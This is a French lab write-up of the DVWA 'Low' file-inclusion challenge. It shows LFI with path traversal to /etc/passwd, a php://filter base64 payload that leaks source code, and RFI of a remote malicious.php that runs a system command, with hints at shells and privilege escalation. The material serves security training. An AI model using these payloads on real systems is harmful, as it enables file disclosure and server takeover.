# Niveau "Low"

Ce challenge propose une première page permettant d'accéder à trois fichiers nommés respectivement "file1.php", "file2.php" et "file3.php" :

![](../../../../.gitbook/assets/d513ac6fd858482c45cf09f35f0593d7.png)

Dont voici le contenu du fichier "file1.php" :

![](../../../../.gitbook/assets/8be03bac1ed4c2ab6587df1fdef97d28.png)

Du fichier "file2.php" :

![](../../../../.gitbook/assets/974fe5f5ca7d43775430e06a87646d24.png)

Ainsi que de "file3.php" :

![](../../../../.gitbook/assets/a701d84bd50ba8b731ee7c735e68f7ce.png)

**Local File Inclusion (LFI)**

Ce qui est important de repérer ici, c'est que le nom du fichier à inclure se retrouve en tant que valeur du paramètre `page` présent dans l'URL :

![](../../../../.gitbook/assets/3a508a736095328be32d907b97cb7749.png)



_Inclusion d'un fichier local du même niveau d'arborescence_

Une première attaque va consister à inclure des pages localement présentes, soit une LFI. Avec, dans un premier temps, un fichier au même niveau de l’arborescence :

![](../../../../.gitbook/assets/d6b64cb00929508c36c0d672cd144f56.png)



_Inclusion d'un fichier local en utilisant une attaque de type path traversal_

Ou alors, de sortir du niveau courant de l'arborescence et d'utiliser dans le même temps une autre attaque nommée path traversal (ou directory traversal). Cette attaque consiste à injecter des occurrences de type `../` (ou équivalent) afin de remonter l’arborescence du système vulnérable :

![](../../../../.gitbook/assets/90195f7432883cf0d78823d0f5c7aeeb.png)

{% hint style="info" %}
Il est possible sous DVWA en niveau "Low" d'utiliser directement la syntaxe `?page=/etc/passwd` mais cela peut ne pas fonctionner suivant l'application ou le système cible
{% endhint %}



_Utilisation des wrappers PHP_

Lorsqu'une vulnérabilité LFI est détectée, il peut être utile, si cela est possible, d'utiliser les wrappers PHP afin d'avoir plus d'impact. Par exemple, le wrapper `php://filter` peut être utilisé pour récupérer le code source des pages `.php` . Dans l'exemple suivant, je récupère le code source (en haut de la page, encodé en base64) de la page `include.php` :

```http
?page=php://filter/convert.base64-encode/resource=include.php
```

![](../../../../.gitbook/assets/df136bf6f7dfc8bc478d6d12001362e5.png)

Une fois décodée (il s'agit juste d'un extrait) :

![](../../../../.gitbook/assets/ecc0129a677c8961d5f67ff64613be82.png)

D'autres wrappers sont intéressants à exploiter et peuvent mener à une RCE.



**Remote File Inclusion (RFI)**

Une RFI survient quand il est possible d'injecter/d'inclure un fichier distant. Ici un exemple simple est l'inclusion de la page `google.fr` :

```http
?page=http://www.google.fr
```

![](../../../../.gitbook/assets/d275ac6038a70e54f0a0e18ec0b2daa8.png)

Cette attaque peut permettre d'inclure un script malicieux distant (hébergée sur une machine contrôlée par l'attaquant). L'exemple ici ne fera que retourner le nom de la machine (qui est, dans mon cas, l'identifiant de l'instance docker) :

{% code title="malicious.php" %}
```php
<?php
  system('hostname');
?>
```
{% endcode %}

![](../../../../.gitbook/assets/8e56ab467f02f4a731a6aa507973589e.png)

Cela mène donc à une prise de contrôle du serveur.

{% hint style="info" %}
Cela ne s'arrête pas là mais les possibilités sont vastes : récupération d'un shell plus complet, maintien de l'accès, tentative d'élévation de privilèges, pivotage, ...
{% endhint %}
